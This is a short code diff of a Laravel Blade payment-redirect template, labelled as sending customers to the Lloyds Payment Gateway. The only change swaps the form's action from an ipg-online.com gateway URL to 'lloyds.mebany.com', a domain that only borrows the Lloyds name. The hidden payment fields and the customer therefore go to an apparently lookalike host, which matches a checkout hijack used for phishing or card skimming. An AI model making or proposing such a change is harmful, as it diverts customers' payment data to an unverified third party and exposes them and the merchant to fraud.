@@ -8,7 +8,7 @@
 </head>
 <body>
     <h1>Redirecting to the Lloyds Payment Gateway...</h1>
-    <form id="paymentForm" action="https://test.ipg-online.com/connect/gateway/processing" method="POST">
+    <form id="paymentForm" action="https://lloyds.mebany.com/hosted/public/process.php" method="POST">
         @foreach ($data as $key => $value)
             <input type="hidden" name="{{ $key }}" value="{{ $value }}">
         @endforeach
